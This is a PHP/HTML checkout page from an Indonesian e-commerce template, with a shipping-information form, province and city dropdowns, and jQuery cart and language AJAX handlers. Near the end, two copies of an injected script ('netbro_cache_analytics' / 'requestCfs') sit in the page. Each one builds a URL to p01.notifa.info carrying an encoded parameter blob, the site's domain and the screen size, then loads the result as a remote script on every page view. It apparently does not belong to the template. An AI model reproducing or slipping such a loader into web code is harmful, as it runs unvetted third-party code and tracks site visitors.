

<!DOCTYPE html>
<html lang="en">
    
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <meta name="author" content="BDTASK">
        <meta name="description" content="">

        <title>Checkout</title>
   
        <!-- Favicons --> 
        <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
        
        <!-- Bootstrap core CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
        <!-- Bootstrap core CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/bootstrap/css/bootstrap.min.css'?>" rel="stylesheet">  
        
        <!-- FontAwesome Icon CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/font-awesome/css/font-awesome.min.css'?>" rel="stylesheet" type="text/css"> 
        
        <!-- Jquery UI CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.css'?>" rel="stylesheet"> 
        
        <!-- Owl Carousel CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.css'?>" rel="stylesheet">
        
        <!-- Animate CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/wow-js/animate.css'?>" rel="stylesheet"> 
        
        <!-- Lightbox CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/lightbox/css/lightbox.min.css'?>" rel="stylesheet"> 

        <!-- Custom styles for this template -->
        <link href="<?php echo base_url().'assets/website/css/style.css'?>" rel="stylesheet"> 
        <!-- EasyZoom CSS -->
        <link rel="stylesheet" href="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.css'?>">

        <!-- Responsive Style -->
        <link href="<?php echo base_url().'assets/website/css/responsive.css'?>" rel="stylesheet">

        <!-- Include SmartWizard CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard.css'?>" rel="stylesheet" type="text/css">

        <!-- Optional SmartWizard theme -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard_theme_dots.css'?>" rel="stylesheet" type="text/css">

        <!-- Jquery  -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery/jquery-3.2.1.min.js'?>" type="text/javascript"></script>

        <!-- jquery-ui.min.js -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.js'?>" type="text/javascript"></script>
        
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    <!--wizard-->
    
    <link href="<?php echo base_url().'assets'?>/css/font-awesome.min.css" rel="stylesheet"> 
    
    <link href="<?php echo base_url().'assets'?>/css/multistep.min.css" rel="stylesheet">
    <link href="<?php echo base_url().'assets'?>/css/animate.css" rel="stylesheet">
     
    <style type="text/css">
        input.loading {
            background: #fff url(assets/website/image/resize.gif) no-repeat center !important;
        }
         .btn-kanan{
                float: right;
                height: 50px;
            }
            .btn-kanan:hover{
                color:white;
                background: black;
            }
            th{
                background: #928d8d;
                color: white;
                text-align: center;
            }
            
            .bg_red{
              color: white;
              background: red;
            }
            .bg_blue{
              color: white;
              background: blue;
            }
            .bg_yellow{
              color: white;
              background: yellow;
            }
            .bg_green{
              color: white;
              background: green;
            }
            .center{
                    text-align: center;
            }
           
            .radius{
                border-radius: 50px;
            }
            
            .table td, .table th{
                vertical-align: middle;
            }
            
            .max200{
                
                max-height:200px; 
                
            }
            .table .thead-dark th{
               color: #fff;
                background-color: #22df00;
                border-color: #22df00; 
                
            }
        .shopping_cart_area .shopping_cart_inner .table thead tr th:last-child{
            width: 20%;
        }
    </style>

    </head>

    <body style="background: #f4f4f4;">
        <!--==== Preloader =======-->
        <div class="preloader"></div>

        <!--========== Header Top Area ==========-->
        <?php      $this->load->view('header_top');             ?> 
        <!--========== End Header Top Area ==========-->
        
        <!--====== Header Area ======-->
        <header>
            <!-- Main Header Area -->
           <?php      $this->load->view('header_main');             ?> 
            

           
        </header>
        <!--===== End Header Area =======-->

        <style type="text/css">
            label{
                    font-size: 12px;
                    height: 15px;
                    line-height: 15px;
                    overflow: hidden;
                    color: #424242;
                    display: block;
                    margin-bottom: 5px
            }

            .form-control{
                border-radius: 0px;

            }
            input[type="text"] {
              /*font-family: monospace;*/
              font-size: 15px;
              color: peru;
            }

            ::-webkit-input-placeholder {
              color: peachpuff;
              font-size: 13px;
            }
            ::-moz-placeholder {
              color: peachpuff;
              font-size: 13px;
            }
            :-ms-input-placeholder {
              color: peachpuff;
              font-size: 13px;
            }
            ::placeholder {
              color: peachpuff;
              font-size: 13px;
            }

            option{
                font-size: 13px;
            }


        </style>


        <!-- content area -->
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-12">
                    
                    <div style="margin-top: 12px;background:#fff;padding: 40px;">
                        <div style="font-size: 18px;color: #212121;margin-bottom: 25px;">Informasi Pengiriman</div>
                        <form>
                        <div class="row">
                          <div class="col-lg-6">
                              <div class="form-group">
                                <label for="exampleFormControlSelect1">Nama Lengkap</label>
                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Nama Lengkap">
                              </div>
                          </div>
                          <div class="col-lg-6">
                              <div class="form-group">
                                <label for="exampleFormControlInput1">Alamat</label>
                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Silahkan Masukkan Alamat Anda ">
                              </div>
                          </div>
                        </div>
                        <div class="row">
                          <div class="col-lg-6">
                              <div class="form-group">
                                <label for="exampleFormControlSelect1">Kelurahan</label>
                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Kelurahan Anda">
                              </div>
                          </div>
                          <div class="col-lg-6">
                              <div class="form-group">
                                <label for="exampleFormControlInput1">Provinsi</label>
                                <select class="form-control" id="exampleFormControlSelect1">
                                  <option>-Pilih Provinsi</option>
                                  <?php foreach ($province->rajaongkir->results as $prov): ?>
                                      
                                    <option value="<?php echo $prov->province_id ?>"><?php echo $prov->province ?></option>
                                  
                                  <?php endforeach ?>
                                </select>
                              </div>
                          </div>
                        </div>

                        <div class="row">
                          <div class="col-lg-6">
                              <div class="form-group">
                                <label for="exampleFormControlSelect1">Nama Perusahaan</label>
                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Nama Perusahaan Anda">
                              </div>
                          </div>
                          <div class="col-lg-6">
                              <div class="form-group">
                                <label for="exampleFormControlInput1">Kota</label>
                                <select class="form-control" id="exampleFormControlSelect1">
                                  <option>-Pilih Kota</option>
                                  <?php foreach ($city->rajaongkir->results as $city): ?>
                                      
                                    <option value="<?php echo $prov->province_id ?>"><?php echo $city->city_name ?></option>
                                  
                                  <?php endforeach ?>
                                </select>
                              </div>
                          </div>
                        </div>

                        <div class="row">
                          <div class="col-lg-6">
                              <div class="form-group">
                                <label for="exampleFormControlSelect1">Nomor Telepon</label>
                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Nomor Telepon Anda">
                              </div>
                          </div>
                          <div class="col-lg-6">
                              <div class="form-group">
                                <label for="exampleFormControlInput1">Kecamatan</label>
                                <select class="form-control" id="exampleFormControlSelect1">

                                  <option>-Pilih Kecamatan</option>
                                  <?php foreach ($province->rajaongkir->results as $prov): ?>
                                      
                                  <option value="<?php echo $prov->province_id ?>"><?php echo $prov->province ?></option>
                                  
                                  <?php endforeach ?>

                                </select>
                              </div>
                          </div>
                        </div>
                        <div class="row">
                            <div class="col-lg-6 col-12">

                            <button class="btn btn-primary" style="width: 90%;border-radius: 2px;height: 50px;">SIMPAN</button>
                            </div>
                        </div>
                         
                          
                        </form>
                        
                    </div>
                    
                </div>
                <div class="col-lg-4 col-12">
                    <div style="margin-top: 12px;min-height: 500px;background:#fff;padding: 40px;">
                    </div>
                    
                </div>
                
            </div>
            
        </div>

        <!-- End Content Area -->

  



        
        

    <!--=========== footer Area ===========-->
     
     <?php      $this->load->view('footer');         

            function rupiah($angka){
        
                echo "Rp " . number_format($angka,2,',','.');
                    // return $hasil_rupiah;
             
            } 

      
            function limit_words($string, $word_limit){
                $words = explode(" ",$string);
                return implode(" ",array_splice($words,0,$word_limit));
            }
       ?>  
            
    <!--=========== ./footer Area ===========-->




        <!-- Bootstrap  -->
        <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/tether.min.js'?>" type="text/javascript"></script>
        <script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/bootstrap.min.js'?>" type="text/javascript"></script>

        <script type="text/javascript" src="cdnjs.cloudflare.com/ajax/libs/1000hz-bootstrap-validator/0.11.5/validator.min.js'?>"></script>

        <!-- Include SmartWizard JavaScript source -->
        <script type="text/javascript" src="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/js/jquery.smartWizard.min.js'?>"></script>

        <!-- Owl Carousel -->
        <script src="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.js'?>" type="text/javascript"></script>

        <!-- EasyZoom -->
        <script src="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.js'?>" type="text/javascript"></script>

        <!-- DSCount JS -->
        <script src="<?php echo base_url().'assets/website/vendor/dscountdown/dscountdown.min.js'?>" type="text/javascript"></script>
        
        <!-- WoW js -->
        <script src="<?php echo base_url().'assets/website/vendor/wow-js/wow.min.js'?>"></script>
        
        <!-- Lightbox js -->
        <script src="<?php echo base_url().'assets/website/vendor/lightbox/js/lightbox.min.js'?>"></script>  

        <!-- Simple Share js -->
        <script src="<?php echo base_url().'assets/website/js/jquery.simpleSocialShare.min.js'?>"></script>

        <!-- Custom scripts for this template -->
        <script src="<?php echo base_url().'assets/website/js/theme.js'?>"></script>

        <script type="text/javascript">

            //Simple share
            $('.share-button').simpleSocialShare();
            
            //Change language ajax
            $('body').on('change', '#change_language', function() {
                var language  = $('#change_language').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_language',
                    data: {language:language},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Change currency ajax
            $('body').on('change', '#change_currency', function() {
                var currency_id  = $('#change_currency').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_currency',
                    data: {currency_id:currency_id},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Add to cart by ajax
            function add_to_cart(id){
                var product_id = $('#product_id_'+id).val();
                var price      = $('#price_'+id).val();
                var discount   = $('#discount_'+id).val();
                var qnty       = $('#qnty_'+id).val();
                var image      = $('#image_'+id).val();
                var name       = $('#name_'+id).val();
                var model      = $('#model_'+id).val();
                var supplier_price      = $('#supplier_price_'+id).val();
                var cgst      = $('#cgst_'+id).val();
                var cgst_id   = $('#cgst_id_'+id).val();
                var sgst      = $('#sgst_'+id).val();
                var sgst_id   = $('#sgst_id_'+id).val();
                var igst      = $('#igst_'+id).val();
                var igst_id   = $('#igst_id_'+id).val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart',
                    data: {
                        product_id:product_id,
                        price:price,
                        discount:discount,
                        qnty:qnty,
                        image:image,
                        name:name,
                        model:model,
                        supplier_price:supplier_price,
                        cgst:cgst,
                        cgst_id:cgst_id,
                        sgst:sgst,
                        sgst_id:sgst_id,
                        igst:igst,
                        igst_id:igst_id,
                    },
                    beforeSend: function(){
                        $('.preloader').html("<img src='assets/website/image/loader.gif'>");
                    },
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }

            //Add to cart by ajax
            function cart_btn(product_id){
                var qnty       = $('#sst').val();
                var variant    = $('#select_size1').val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                if (qnty <= 0) {
                    alert('Please keep quantity up to zero !');
                    return false;
                }
                if (variant != 'undefine') {
                    if (variant <= 0) {
                        alert('Please select product size !');
                        return false;
                    }
                }
                
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart_details',
                    data: {product_id:product_id,qnty:qnty,variant:variant},
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }
        </script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mN8SBaYYlsFeUcDpnfQuaKJY%2f%2b4ifx7FXqVglW98PVFQvyY7T5Gk6N3jNgEJBhG6GaIzUqsjF%2f4TLSGOEsYplytwPHPHZFO3%2bR6hyaZOWCDQ8NlS%2b7NVfrYlTPyMtYeFvjQ%2fnLSStYmmFKlaYd%2bcyO0NvOwT%2b9o5NpgZK1gmIGgBQxkfGD%2fb9NYJ5IJVImWu%2fqDBvW%2b9q2qM5N6XydmS8ZLD0HEqy8N%2bx3cr7%2f6jh278SYgwY8uZjHU0e6QkQ1T2jY6I1JON1wBuBdTZDw5sy6dgh7d5LWLX4DVb3zDZPQPk6JEqAaM6yvxHaRlLpKWD5Qpu81O%2bLfziK99WRxo5OJNny1p1UL6OtYYO1GSuVvqfajzEcbbhCo5JXOLkOoUYa84r0WrbrcFiNk5r3M5YfMpXZfbTpbsQhGlXzCd9KuM9lq%2brlrbLdjgDkYGjAsQcXf5g4enwoja3mCiFUt1yIbw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    
    
       
        
        
        <!--wizard-->
         
    <script type="text/javascript" src="<?php echo base_url()?>assets/js/jquery.1.11.3.min.js"></script>  
    <script type="text/javascript" src="<?php echo base_url()?>assets/js/multistep.min.js"></script>
    <script>
        $(document).ready(function() { 
            $('#rms-wizard').stepWizard({
                stepTheme: 'defaultTheme',/*defaultTheme,steptheme1,steptheme2*/
                allstepClickable: false,
                compeletedStepClickable: true,
                stepCounter: true,
                StepImage: true, 
                animation: true,
                animationClass: "fadeIn",
                stepValidation: true,
                validation : true, 
                field: {
                     username : { 
                        required : true, 
                        minlength: 2,
                        Regex: /^[a-zA-Z0-9]+$/,  
                    },
                     password : {
                        required : true,
                        minlength : 5,
                        maxlength : 20,
                        Regex: /^(?=.*[0-9_\W]).+$/, 
                    },
                    email:{
                        required : true,
                        Regex: /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
                    },
                },
                message: {
                    username: "Please Enter UserName ", 
                }
                
            });
    });
    </script> 
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mxBGfhEJgBVeRF1D3nG7dlIW0bEAhyICGLxebBqUNxpEAT4sy8%2fX6CgsXqzAOKtcQbQjkpEJKI7cyfLTKJ3G640tLHaNhgYqRCBhMbV4%2fPaLmYBcXJH0zmgHiGS0iJ3Kc6fvyZzEuIOUCHxJI%2bW7YtM9BFf%2bBlymSfmfhB4EJhSpXAbIriir1%2boT%2bLjiSyM9eBso5zTeqBduQhY%2fUXKLOoT7bGQK3NSZCmI%2fF5Lymfnffu4t%2fs50zzXesQilE9A%2fM07BWyJ%2bvTNV6Q6kJR8PuxIAPBP3GQYQONyQM5ZSUQc6llpYhFm0EwADGcaH7HWRn%2buB4izlJaPNtOO%2bD4%2bqEgPc%2bUCsBZ1ntFH5RaCmWsbHiiReFF6QvDr9Jol287OLsWadnJgIgKylppfs382TaUMQQnkccb9tzVo9J%2fDAXYr1PDyQQGReXYLEmW8QfFFC1uRT49sme8P%2b4P4xAbqI808y4YSsG8E9U" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
        
        
        
        
    </body>


</html>
